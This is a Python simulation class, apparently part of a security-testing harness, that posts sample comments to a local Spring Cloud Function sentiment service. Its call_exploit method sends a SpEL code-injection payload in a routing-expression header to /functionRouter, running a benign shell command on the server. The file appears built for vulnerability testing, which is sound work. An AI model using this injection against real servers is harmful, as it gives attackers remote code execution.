import os
import asyncio
import random
import requests
from utils.abstract_scenario import BaseSimulation

class SENTIMENTANALYZER(BaseSimulation):
    def __init__(self):
        super().__init__()
        self.url = "http://localhost:8080"   

    @property
    def name(self) -> str:
        return "SENTIMENT_ANALYZER"
    
    def get_data_dir(self):
        return "sentiment_analyzer"
    
    def cleanup(self):
        pass
    
    async def worker(self, session):
        await asyncio.sleep(random.uniform(0, 5))
        headers = {
            "spring.cloud.function.definition": "analyzeAndUploadTxt",
            "Content-Type": "text/plain"
        }
        base_dir = os.path.dirname(os.path.abspath(__file__))
        dataDir = os.path.join(base_dir, "comments")
        files = [f"{dataDir}/{f}" for f in os.listdir(dataDir) if os.path.isfile(os.path.join(dataDir, f))]
        try:
            filePath = random.choice(files)
            with open(filePath, "rb") as f:
                async with session.post(self.url, data=f, headers=headers) as response:
                    response_text = await response.text()
        except Exception as e:
            pass

    def call_exploit(self):
        headers = {
            "Host": "localhost:8080",
            "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec('touch /tmp/test && rm /tmp/test')"
        }
        data = "exploit_poc"
        url = self.url + "/functionRouter"
        response = requests.post(url, headers=headers, data=data)